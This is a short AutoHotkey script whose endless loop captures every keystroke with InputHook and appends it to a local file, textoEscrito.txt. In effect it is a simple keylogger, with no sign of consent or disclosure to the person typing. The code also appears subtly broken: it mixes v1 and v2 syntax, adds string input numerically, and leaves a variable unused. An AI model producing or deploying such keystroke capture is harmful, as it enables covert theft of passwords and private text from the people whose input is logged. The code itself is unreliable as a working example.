CtrlC := Chr(1) ; Store the character for Ctrl-C in the CtrlC var.

loop{
    ih := InputHook("L1 M")
    ih.Start()
    ih.Wait()
    patito := ih.Input
    patito2 := patito + ih.Input
    FileAppend , %patito2% ,  %A_WorkingDir%\textoEscrito.txt
    ;MsgBox % ih.Input 
}

